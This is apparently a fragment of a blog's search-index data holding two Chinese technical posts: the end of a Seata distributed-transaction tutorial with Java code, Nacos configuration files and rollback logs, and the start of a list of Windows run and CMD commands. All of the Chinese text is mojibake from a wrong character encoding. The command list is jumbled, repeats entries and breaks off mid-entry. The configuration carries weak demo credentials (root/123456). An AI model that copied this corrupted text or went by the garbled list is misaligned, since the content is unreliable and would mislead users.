{ Thread.sleep(10000); } catch (InterruptedException e) { e.printStackTrace(); } // æ ¡éªŒå‚æ•° if (money == null || money.compareTo(BigDecimal.ZERO) &lt; 1) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // åˆ¤æ–­ä½™é¢æ˜¯å¦è¶³å¤Ÿ if (money.compareTo(residue) == 1) { return new CommonResult(SystemCode.ACCOUNT_NOT_ENOUGH); } // // æ‰£å‡ä½™é¢ account.setUsed(account.getUsed().add(money)); account.setResidue(account.getResidue().subtract(money)); accountMapper.update(account); return new CommonResult(); }} 7.5ã€åˆ›å»ºä¸»å¯åŠ¨ç±»123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class AccountApplication { public static void main(String[] args) { SpringApplication.run(AccountApplication.class, args); }} 8ã€æµ‹è¯•é¡¹ç›®ä»£ç  1ï¼‰é¦–å…ˆå¯åŠ¨ MySQL Serverã€Nacos Serverã€Seata Serverï¼Œå¹¶æŒ‰ç…§ä¸Šæ–‡ä»‹ç»çš„å‡†å¤‡å·¥ä½œè¿›è¡Œåˆå§‹åŒ– 2ï¼‰åˆ†åˆ«å¯åŠ¨ seata-account-serviceã€seata-storage-serviceã€seata-order-service æœåŠ¡ 3ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:8848/nacos æ‰“å¼€ Nacos çš„æ§åˆ¶å°ï¼Œå„æœåŠ¡æˆåŠŸå¯åŠ¨åï¼Œåœ¨ Nacos çš„æ§åˆ¶å°é‡Œå¯ä»¥çœ‹åˆ°æœ‰å¤šä¸ªæœåŠ¡å·²æ³¨å†Œï¼ˆå¦‚ä¸‹å›¾ï¼‰ 4ï¼‰è§‚å¯Ÿä¸åŒæ•°æ®åº“ä¸­çš„ seata_account.t_accountã€seata_storage.t_storage ä¸šåŠ¡è¡¨çš„æ•°æ®ï¼Œå¦‚ä¸‹å›¾ï¼š 5ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:2001/order/create?userId=1&amp;count=3&amp;money=20&amp;productId=1 è°ƒç”¨è®¢å•åˆ›å»ºæ¥å£ï¼Œç”±äºè®¢å•æœåŠ¡è¿œç¨‹è°ƒç”¨è´¦æˆ·æœåŠ¡æ¥æ‰£å‡è´¦æˆ·ä½™é¢æ—¶ï¼ŒæŠ›å‡ºäº†è¯·æ±‚è¶…æ—¶çš„å¼‚å¸¸ï¼Œå› æ­¤å“åº”çš„ 500 é”™è¯¯é¡µé¢æ˜¾ç¤ºå¦‚ä¸‹ï¼š 6ï¼‰å†è§‚å¯Ÿä¸åŒæ•°æ®åº“ä¸­çš„ seata_account.t_accountã€seata_storage.t_storage ä¸šåŠ¡è¡¨çš„æ•°æ®æ˜¯å¦å‘ç”Ÿäº†å˜æ›´ï¼Œè‹¥æ•°æ®æ²¡æœ‰å˜æ›´ï¼Œåˆ™è¯´æ˜å…¨å±€äº‹åŠ¡æ³¨è§£ @GlobalTransactional ç”Ÿæ•ˆäº†ï¼Œå¦åˆ™æ³¨è§£æ²¡æœ‰ç”Ÿæ•ˆ 7ï¼‰åˆ›å»ºè®¢å•çš„æ¥å£è¢«è°ƒç”¨åï¼Œå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªåº”ç”¨åœ¨æ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—å¦‚ä¸‹ï¼š â˜…å„å¾®æœåŠ¡çš„æ—¥å¿—ä¿¡æ¯â˜… 123456789101112################## seata_order æœåŠ¡çš„æ—¥å¿— #####################java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at java.base/java.io.BufferedInputStream.fill(BufferedInputStream.java:252) ~[na:na] at java.base/java.io.BufferedInputStream.read1(BufferedInputStream.java:292) ~[na:na] at java.base/java.io.BufferedInputStream.read(BufferedInputStream.java:351) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:746) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:689) ~[na:na] 123456################## seata_storage æœåŠ¡çš„æ—¥å¿— #####################[_RMROLE_1_2_144] i.s.c.r.p.c.RmBranchRollbackProcessor : rm handle branch rollback process:xid=192.168.1.130:8091:86489181212647424,branchId=86489188837892097,branchType=AT,resourceId=jdbc:mysql://127.0.0.1:3306/seata_storage,applicationData=null[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacking: 192.168.1.130:8091:86489181212647424 86489188837892097 jdbc:mysql://127.0.0.1:3306/seata_storage[_RMROLE_1_2_144] i.s.r.d.undo.AbstractUndoLogManager : xid 192.168.1.130:8091:86489181212647424 branch 86489188837892097, undo_log deleted with GlobalFinished[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacked result: PhaseTwo_Rollbacked 1234567891011################## seata_account æœåŠ¡çš„æ—¥å¿— #####################io.seata.core.exception.RmTransactionException: Response[ TransactionException[Could not found global transaction xid = 192.168.1.130:8091:86489181212647424, may be has finished.] ] at io.seata.rm.AbstractResourceManager.branchRegister(AbstractResourceManager.java:69) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.DefaultResourceManager.branchRegister(DefaultResourceManager.java:96) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.register(ConnectionProxy.java:241) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.processGlobalTransactionCommit(ConnectionProxy.java:219) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.doCommit(ConnectionProxy.java:199) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.lambda$commit$0(ConnectionProxy.java:184) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy$LockRetryPolicy.execute(ConnectionProxy.java:292) ~[seata-all-1.4.0.jar:1.4.0] at io.seata.rm.datasource.ConnectionProxy.commit(ConnectionProxy.java:183) ~[seata-all-1.4.0.jar:1.4.0] 9ã€Seata Server æ•´åˆ Nacos é…ç½®ä¸­å¿ƒåœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ Nacos é…ç½®ä¸­å¿ƒæ¥å­˜å‚¨ TCï¼ˆSeata Serverï¼‰ç›¸å…³çš„é…ç½®ä¿¡æ¯ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨äº† file.conf ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸€èˆ¬æå°‘é‡‡ç”¨è¿™ç§æ–¹å¼ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œå½“ä½¿ç”¨ Seata Server ä½¿ç”¨ Nacos ä½œä¸ºé…ç½®ä¸­å¿ƒåï¼ŒSeata Server å¯åŠ¨æ—¶åªéœ€è¦ä¾èµ– registry.confï¼Œå³ä¸å†éœ€è¦ file.confã€‚åŒæ—¶åœ¨ Spring Cloud åº”ç”¨ä¸­ä¸å†éœ€è¦ä¾èµ–ä»»ä½• file.confã€registry.confï¼Œç›´æ¥åœ¨ bootstrap.yml é‡Œå°±å¯ä»¥å®Œæˆ Seata çš„æ‰€æœ‰é…ç½®ã€‚ 9.1ã€é…ç½® Seata Server çš„ registry.confåœ¨ Seata Server çš„ registry.conf é‡Œï¼ŒæŒ‡å®šä½¿ç”¨é…ç½®ä¸­å¿ƒæ¥å­˜å‚¨ TC çš„ç›¸å…³é…ç½®ï¼ˆå¦‚ä¸‹ï¼‰ 12345678910111213141516171819202122232425registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" group = "seata_demo" username = "" password = "" }} 9.2ã€å¯¼å…¥é…ç½®ä¿¡æ¯åˆ° Nacos é…ç½®ä¸­å¿ƒSeata å®˜æ–¹æä¾›äº†å°†é…ç½®ä¿¡æ¯ï¼ˆfile.confï¼‰æ‰¹é‡å¯¼å…¥åˆ°å„ç§ä¸»æµé…ç½®ä¸­å¿ƒçš„ Shell è„šæœ¬ï¼Œå­˜æ”¾è·¯å¾„æ˜¯åœ¨ Seata æºç ç›®å½•ä¸‹çš„ script/config-center ç›®å½•ï¼ˆå¦‚ä¸‹ï¼‰ 1234567891011121314script/config-centerâ”œâ”€â”€ apolloâ”‚&nbsp;&nbsp; â””â”€â”€ apollo-config.shâ”œâ”€â”€ config.txtâ”œâ”€â”€ consulâ”‚&nbsp;&nbsp; â””â”€â”€ consul-config.shâ”œâ”€â”€ etcd3â”‚&nbsp;&nbsp; â””â”€â”€ etcd3-config.shâ”œâ”€â”€ nacosâ”‚&nbsp;&nbsp; â”œâ”€â”€ nacos-config.pyâ”‚&nbsp;&nbsp; â””â”€â”€ nacos-config.shâ”œâ”€â”€ README.mdâ””â”€â”€ zk â””â”€â”€ zk-config.sh å…¶ä¸­ config.txt ä¸ºé€šç”¨å‚æ•°æ–‡ä»¶ï¼ŒåŒ…å«äº† Seata Serverï¼ˆTCï¼‰éœ€è¦çš„æ‰€æœ‰é…ç½®ä¿¡æ¯ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹æ–‡ä»¶é‡Œçš„ä»¥ä¸‹å†…å®¹ï¼š 1234567891011service.vgroupMapping.seata-order-service-tx-group=defaultservice.vgroupMapping.seata-storage-service-tx-group=defaultservice.vgroupMapping.seata-account-service-tx-group=defaultstore.mode=dbstore.db.datasource=druidstore.db.dbType=mysqlstore.db.driverClassName=com.mysql.cj.jdbc.Driverstore.db.url=jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=falsestore.db.user=rootstore.db.password=123456 é€šç”¨å‚æ•°æ–‡ä»¶ config.txt æ›´æ”¹å®Œæˆåï¼Œæ‰§è¡Œå¯¹åº”çš„ Shell è„šæœ¬å°†é…ç½®ä¿¡æ¯å†™å…¥åˆ°é…ç½®ä¸­å¿ƒå³å¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œconfig.txt æ–‡ä»¶å¿…é¡»åœ¨ xxxx.sh çš„ä¸Šçº§ç›®å½•é‡Œï¼Œè€Œä¸” Shell è„šæœ¬å¯ä»¥é‡å¤æ‰§è¡Œå¤šæ¬¡ã€‚è‹¥ä½¿ç”¨ Nacos ä½œä¸ºé…ç½®ä¸­å¿ƒï¼Œæ‰§è¡Œè„šæœ¬æ—¶å¯ä»¥æŒ‡å®šä¸€äº›å¯åŠ¨å‚æ•°ï¼Œå¦‚ Nacos çš„ IPã€ç«¯å£å·ã€å‘½åç©ºé—´ã€é…ç½®ç»„ç­‰ï¼ŒShell è„šæœ¬çš„å…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥æŸ¥çœ‹å®˜æ–¹è¯´æ˜æ–‡æ¡£ 12# æ‰§è¡Œæ•°æ®å¯¼å…¥è„šæœ¬$ sh nacos-config.sh -h 127.0.0.1 -p 8848 -t ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d -g seata_demo æˆåŠŸæ‰¹é‡å¯¼å…¥é…ç½®ä¿¡æ¯åˆ° Nacos åï¼Œæ§åˆ¶å°ä¼šè¾“å‡ºå¦‚ä¸‹æç¤ºï¼š 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. è®¿é—® Nacos çš„æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æœ‰å¯¹åº”çš„é…ç½®ä¿¡æ¯ï¼ˆå¦‚ä¸‹ï¼‰ï¼š 9.3ã€é…ç½® Spring Cloud é¡¹ç›®ä»¥è®¢å•æ¨¡å—ä¸ºä¾‹ï¼Œbootstrap.yml çš„å®Œæ•´é…ç½®å¦‚ä¸‹ï¼Œæ­¤æ—¶è®¢å•æ¨¡å—çš„ src/main/resources ç›®å½•ä¸‹ä¸å†éœ€è¦å­˜æ”¾ file.confã€registry.conf é…ç½®æ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nacos: # Nacosçš„åœ°å€ server-addr: 127.0.0.1:8848 # Nacosçš„å‘½åç©ºé—´ namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacosçš„é…ç½®åˆ†ç»„ group: seata_demo # Seata Serverçš„é…ç½® seata: application: seata-server tx-service-group: seata-order-service-tx-group####### ä»¥ä¸Šæ˜¯è‡ªå®šä¹‰é…ç½®ä¸­å¿ƒå’Œæ³¨å†Œä¸­å¿ƒçš„å…±åŒå±æ€§ï¼Œæ–¹ä¾¿å…¶ä»–åœ°æ–¹ç›´æ¥å¼•ç”¨ #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} config: server-addr: ${nacos.server-addr} prefix: ${spring.application.name} file-extension: yaml namespace: ${nacos.namespace} group: ${nacos.group} # ä»¥ä¸‹é…ç½®å†…å®¹å‡å¯ä»¥æ·»åŠ åœ¨Nacosé…ç½®ä¸­å¿ƒ datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: nacos nacos: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: ""feign: hystrix: enabled: falselogging: level: io: seata: info 9.4ã€ä»£ç ä¸‹è½½ï¼ˆé…ç½®ä¸­å¿ƒç‰ˆï¼‰ ç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼ˆé…ç½®ä¸­å¿ƒç‰ˆï¼‰ 10ã€å‚è€ƒèµ„æ–™ Spring Cloud å¿«é€Ÿé›†æˆ Seata ä¸‹ç¯‡ - Seata å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Seata å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ åˆ†å¸ƒå¼"},{title:"CMD å‘½ä»¤å¤§å…¨",url:"/posts/49651ebe.html",text:'1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071. appwiz.cplï¼šç¨‹åºå’ŒåŠŸèƒ½ 2. calcï¼šå¯åŠ¨è®¡ç®—å™¨ 5. chkdsk.exeï¼šç£ç›˜æ£€æŸ¥6. cleanmgr: æ‰“å¼€ç£ç›˜æ¸…ç†å·¥å…· 9. cmd.exeï¼šCMDå‘½ä»¤æç¤ºç¬¦ 10. è‡ªåŠ¨å…³æœºå‘½ä»¤ Shutdown -s -t 600ï¼šè¡¨ç¤º600ç§’åè‡ªåŠ¨å…³æœº shutdown -a ï¼šå¯å–æ¶ˆå®šæ—¶å…³æœº Shutdown -r -t 600ï¼šè¡¨ç¤º600ç§’åè‡ªåŠ¨é‡å¯ 12. CompMgmtLauncherï¼šè®¡ç®—æœºç®¡ç† 13. compmgmt.mscï¼šè®¡ç®—æœºç®¡ç† 14. credwizï¼šå¤‡ä»½æˆ–è¿˜åŸå‚¨å­˜çš„ç”¨æˆ·åå’Œå¯†ç  16. controlï¼šæ§åˆ¶é¢ç‰ˆ 17. dcomcnfgï¼šæ‰“å¼€ç³»ç»Ÿç»„ä»¶æœåŠ¡ 19. devmgmt.mscï¼šè®¾å¤‡ç®¡ç†å™¨ 20. desk.cplï¼šå±å¹•åˆ†è¾¨ç‡ 21. dfrguiï¼šä¼˜åŒ–é©±åŠ¨å™¨22. dialerï¼šç”µè¯æ‹¨å·ç¨‹åº 23. diskmgmt.mscï¼šç£ç›˜ç®¡ç† 24. dvdplayï¼šDVDæ’­æ”¾å™¨ 25. dxdiagï¼šæ£€æŸ¥DirectXä¿¡æ¯ 26. eudceditï¼šé€ å­—ç¨‹åº 27. eventvwrï¼šäº‹ä»¶æŸ¥çœ‹å™¨ 28. explorerï¼šæ‰“å¼€èµ„æºç®¡ç†å™¨ 29. Firewall.cplï¼šWindowsé˜²ç«å¢™ 31. fsmgmt.mscï¼šå…±äº«æ–‡ä»¶å¤¹ç®¡ç†å™¨ 32. gpedit.mscï¼šç»„ç­–ç•¥ 33. hdwwiz.cplï¼šè®¾å¤‡ç®¡ç†å™¨ 34. inetcpl.cplï¼šInternetå±æ€§ 35. intl.cplï¼šåŒºåŸŸ 36. iexpressï¼šæœ¨é©¬æ†ç»‘å·¥å…·37. joy.cplï¼šæ¸¸æˆæ§åˆ¶å™¨ 38. logoffï¼šæ³¨é”€å‘½ä»¤ 39. lusrmgr.mscï¼šæœ¬åœ°ç”¨æˆ·å’Œç»„ 40. lpksetupï¼šè¯­è¨€åŒ…å®‰è£…/åˆ é™¤å‘å¯¼41. lusrmgr.mscï¼šæœ¬æœºç”¨æˆ·å’Œç»„ 42. main.cplï¼šé¼ æ ‡å±æ€§ 43. mmsys.cplï¼šå£°éŸ³ 45. mem.exeï¼šæ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ47. mmcï¼šæ‰“å¼€æ§åˆ¶å° 48. mobsyncï¼šåŒæ­¥å‘½ä»¤ 50. msconfig.exeï¼šç³»ç»Ÿé…ç½®å®ç”¨ç¨‹åº 51. msdtï¼šå¾®è½¯æ”¯æŒè¯Šæ–­å·¥å…· 52. msinfo32ï¼šç³»ç»Ÿä¿¡æ¯ 53. mspaintï¼šç”»å›¾ 54. Msraï¼šWindowsè¿œç¨‹ååŠ© 55. mstscï¼šè¿œç¨‹æ¡Œé¢è¿æ¥ 56. NAPCLCFG.MSCï¼šå®¢æˆ·ç«¯é…ç½® 57. ncpa.cplï¼šç½‘ç»œè¿æ¥ 58. narratorï¼šå±å¹•â€œè®²è¿°äººâ€ 59. Netplwizï¼šé«˜çº§ç”¨æˆ·å¸æˆ·æ§åˆ¶é¢æ¿ï¼Œè®¾ç½®ç™»é™†å®‰å…¨ç›¸å…³çš„é€‰é¡¹ 60. netstat : an(TC)å‘½ä»¤æ£€æŸ¥æ¥å£ 61. notepadï¼šæ‰“å¼€è®°äº‹æœ¬ 62. Nslookupï¼šIPåœ°å€ä¾¦æµ‹å™¨ 63. odbcad32ï¼šODBCæ•°æ®æºç®¡ç†å™¨ 64. OptionalFeaturesï¼šæ‰“å¼€â€œæ‰“å¼€æˆ–å…³é—­WindowsåŠŸèƒ½â€å¯¹è¯æ¡† 65. oskï¼šæ‰“å¼€å±å¹•é”®ç›˜ 66. perfmon.mscï¼šè®¡ç®—æœºæ€§èƒ½ç›‘æµ‹å™¨ 67. perfmonï¼šè®¡ç®—æœºæ€§èƒ½ç›‘æµ‹å™¨ 68. PowerShellï¼šæä¾›å¼ºå¤§è¿œç¨‹å¤„ç†èƒ½åŠ› 69. printmanagement.mscï¼šæ‰“å°ç®¡ç† 70. powercfg.cplï¼šç”µæºé€‰é¡¹ 71. psrï¼šé—®é¢˜æ­¥éª¤è®°å½•å™¨ 72. Rasphoneï¼šç½‘ç»œè¿æ¥ 73. Recdiscï¼šåˆ›å»ºç³»ç»Ÿä¿®å¤å…‰ç›˜ 74. Resmonï¼šèµ„æºç›‘è§†å™¨ 75. Rstruiï¼šç³»ç»Ÿè¿˜åŸ 76. regedit.exeï¼šæ³¨å†Œè¡¨ 77. regedt32ï¼šæ³¨å†Œè¡¨ç¼–è¾‘å™¨ 78. rsop.mscï¼šç»„ç­–ç•¥ç»“æœé›† 79. sdcltï¼šå¤‡ä»½çŠ¶æ€ä¸é…ç½®ï¼Œå°±æ˜¯æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦å·²å¤‡ä»½ 80. secpol.mscï¼šæœ¬åœ°å®‰å…¨ç­–ç•¥ 81. services.mscï¼šæœ¬åœ°æœåŠ¡è®¾ç½® 82. sfc /scannowï¼šæ‰«æé”™è¯¯å¹¶å¤åŸ/windowsæ–‡ä»¶ä¿æŠ¤ 83. sfc.exeï¼šç³»ç»Ÿæ–‡ä»¶æ£€æŸ¥å™¨ 84. shrpubwï¼šåˆ›å»ºå…±äº«æ–‡ä»¶å¤¹ 85. sigverifï¼šæ–‡ä»¶ç­¾åéªŒè¯ç¨‹åº 86. sluiï¼šWindowsæ¿€æ´»ï¼ŒæŸ¥çœ‹ç³»ç»Ÿæ¿€æ´»ä¿¡æ¯ 87. slmgr.vbs -dlv ï¼šæ˜¾ç¤ºè¯¦ç»†çš„è®¸å¯è¯ä¿¡æ¯ slmgr.vbs -dli ï¼šæ˜¾ç¤ºè®¸å¯è¯ä¿¡æ¯ slmgr.vbs -xpr ï¼šå½“å‰è®¸å¯è¯æˆªæ­¢æ—¥æœŸ slmgr.vbs -dti ï¼šæ˜¾ç¤ºå®‰è£…ID ä»¥è¿›è¡Œè„±æœºæ¿€ slmgr.vbs -ipk ï¼š(Product Key)å®‰è£…äº§å“å¯†é’¥ slmgr.vbs -ato ï¼šæ¿€æ´»Windows slmgr.vbs -cpky ï¼šä»æ³¨å†Œè¡¨ä¸­æ¸…é™¤äº§å“å¯†é’¥ï¼ˆé˜²æ­¢æ³„éœ²å¼•èµ·çš„æ”»å‡»ï¼‰ slmgr.vbs -ilc ï¼š(License file)å®‰è£…è®¸å¯è¯ slmgr.vbs -upk ï¼šå¸è½½äº§å“å¯†é’¥ slmgr.vbs -skms ï¼š(name[ort] )æ‰¹é‡æˆæƒ 88. snippingtoolï¼šæˆªå›¾å·¥å…·ï¼Œæ”¯æŒæ— è§„åˆ™æˆªå›¾ 89. soundrecorderï¼šå½•éŸ³æœºï¼Œæ²¡æœ‰å½•éŸ³æ—¶é—´çš„é™åˆ¶ 90. StikyNotï¼šä¾¿ç¬º 91. sysdm.cplï¼šç³»ç»Ÿå±æ€§ 92. syseditï¼šç³»ç»Ÿé…ç½®ç¼–è¾‘å™¨ 93. syskeyï¼šç³»ç»ŸåŠ å¯†ï¼Œä¸€æ—¦åŠ å¯†å°±ä¸èƒ½è§£å¼€ï¼Œä¿æŠ¤ç³»ç»Ÿçš„åŒé‡å¯†ç  94. taskmgrï¼šä»»åŠ¡ç®¡ç†å™¨ï¼ˆæ—§ç‰ˆï¼‰ 96. taskschd.mscï¼šä»»åŠ¡è®¡åˆ’ç¨‹åº 97. timedate.cplï¼šæ—¥æœŸå’Œæ—¶é—´ 99. utilmanï¼šè¾…åŠ©å·¥å…·ç®¡ç†å™¨ 100. wf.mscï¼šé«˜çº§å®‰å…¨Windowsé˜²ç«å¢™ 101. WFSï¼šWindowsä¼ çœŸå’Œæ‰«æ 102. wiaacmgrï¼šæ‰«æä»ªå’Œç…§ç›¸æœºå‘å¯¼ 103. winverï¼šå…³äºWindows 104. wmimgmt.mscï¼šæ‰“å¼€windowsç®¡ç†ä½“ç³»ç»“æ„(WMI) 105. writeï¼šå†™å­—æ¿106. wscui.cplï¼šæ“ä½œä¸­å¿ƒ 107. wscriptï¼šwindowsè„šæœ¬å®¿ä¸»è®¾ç½® 108. wuappï¼šWindowsæ›´æ–° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991. gpedit.mscï¼šç»„ç­–ç•¥2. sndrec32ï¼šå½•éŸ³æœº3. Nslookupï¼šIPåœ°å€ä¾¦æµ‹å™¨4. explorerï¼šæ‰“å¼€èµ„æºç®¡ç†å™¨ 5. logoffï¼šæ³¨é”€å‘½ä»¤6. shutdownï¼š60ç§’å€’è®¡æ—¶å…³æœºå‘½ä»¤7. lusrmgr.mscï¼šæœ¬æœºç”¨æˆ·å’Œç»„8. services.mscï¼šæœ¬åœ°æœåŠ¡è®¾ç½®9. oobe/msoobe /aï¼šæ£€æŸ¥XPæ˜¯å¦æ¿€æ´»10. notepadï¼šæ‰“å¼€è®°äº‹æœ¬ 11. cleanmgrï¼šåƒåœ¾æ•´ç†12. net start messengerï¼šå¼€å§‹ä¿¡ä½¿æœåŠ¡13. compmgmt.mscï¼šè®¡ç®—æœºç®¡ç†14. net stop messengerï¼šåœæ­¢ä¿¡ä½¿æœåŠ¡15. confï¼šå¯åŠ¨netmeeting16. dvdplayï¼šDVDæ’­æ”¾å™¨17. charmapï¼šå¯åŠ¨å­—ç¬¦æ˜ å°„è¡¨18. diskmgmt.mscï¼šç£ç›˜ç®¡ç†å®ç”¨ç¨‹åº19. calcï¼šå¯åŠ¨è®¡ç®—å™¨20. dfrg.mscï¼šç£ç›˜ç¢ç‰‡æ•´ç†ç¨‹åº21. chkdsk.exeï¼šChkdskç£ç›˜æ£€æŸ¥22. devmgmt.mscï¼šè®¾å¤‡ç®¡ç†å™¨ 24. drwtsn32ï¼šç³»ç»ŸåŒ»ç”Ÿ25. rononce -pï¼š15ç§’å…³æœº26. dxdiagï¼šæ£€æŸ¥DirectXä¿¡æ¯27. regedt32ï¼šæ³¨å†Œè¡¨ç¼–è¾‘å™¨ 29. rsop.mscï¼šç»„ç­–ç•¥ç»“æœé›†30. mem.exeï¼šæ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ31. regedit.exeï¼šæ³¨å†Œè¡¨32. winchatï¼šXPè‡ªå¸¦å±€åŸŸç½‘èŠå¤©33. progmanï¼šç¨‹åºç®¡ç†å™¨34. winmsdï¼šç³»ç»Ÿä¿¡æ¯35. perfmon.mscï¼šè®¡ç®—æœºæ€§èƒ½ç›‘æµ‹ç¨‹åº36. winverï¼šæ£€æŸ¥Windowsç‰ˆæœ¬37. sfc /scannowï¼šæ‰«æé”™è¯¯å¹¶å¤åŸ38. taskmgrï¼šä»»åŠ¡ç®¡ç†å™¨39. winverï¼šæ£€æŸ¥Windowsç‰ˆæœ¬40. wmimgmt.mscï¼šæ‰“å¼€windowsç®¡ç†ä½“ç³»ç»“æ„(WMI)41. wupdmgrï¼šwindowsæ›´æ–°ç¨‹åº42. wscriptï¼šwindowsè„šæœ¬å®¿ä¸»è®¾ç½®43. writeï¼šå†™å­—æ¿44. winmsdï¼šç³»ç»Ÿä¿¡æ¯45. wiaacmgrï¼šæ‰«æä»ªå’Œç…§ç›¸æœºå‘å¯¼46. winchatï¼šXPè‡ªå¸¦å±€åŸŸç½‘èŠå¤©47. mem.exeï¼šæ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ48. msconfig.exeï¼šç³»ç»Ÿé…ç½®å®ç”¨ç¨‹åº49. mplayer2ï¼šç®€æ˜“widnows media player50. mspaintï¼šç”»å›¾æ¿51. mstscï¼šè¿œç¨‹æ¡Œé¢è¿æ¥52. mplayer2ï¼šåª’ä½“æ’­æ”¾æœº53. magnifyï¼šæ”¾å¤§é•œå®ç”¨ç¨‹åº54. mmcï¼šæ‰“å¼€æ§åˆ¶å°55. mobsyncï¼šåŒæ­¥å‘½ä»¤56. dxdiagï¼šæ£€æŸ¥DirectXä¿¡æ¯57. iexpressï¼šæœ¨é©¬æ†ç»‘å·¥å…·58. fsmgmt.mscï¼šå…±äº«æ–‡ä»¶å¤¹ç®¡ç†å™¨59. utilmanï¼šè¾…åŠ©å·¥å…·ç®¡ç†å™¨60. diskmgmt.mscï¼šç£ç›˜ç®¡ç†å®ç”¨ç¨‹åº61. dcomcnfgï¼šæ‰“å¼€ç³»ç»Ÿç»„ä»¶æœåŠ¡62. ddeshareï¼šæ‰“å¼€DDEå…±äº«è®¾ç½®110. oskï¼šæ‰“å¼€å±å¹•é”®ç›˜ 111. odbcad32ï¼šODBCæ•°æ®æºç®¡ç†å™¨112. oobe/msoobe /aï¼šæ£€æŸ¥XPæ˜¯å¦æ¿€æ´»114. logoffï¼šæ³¨é”€å‘½ä»¤66. notepadï¼šæ‰“å¼€è®°äº‹æœ¬67. nslookupï¼šç½‘ç»œç®¡ç†çš„å·¥å…·å‘å¯¼68. ntbackupï¼šç³»ç»Ÿå¤‡ä»½å’Œè¿˜åŸ69. narratorï¼šå±å¹•â€œè®²è¿°äººâ€70. ntmsmgr.mscï¼šç§»åŠ¨å­˜å‚¨ç®¡ç†å™¨71. ntmsoprq.mscï¼šç§»åŠ¨å­˜å‚¨ç®¡ç†å‘˜æ“ä½œè¯·æ±‚72. netstat 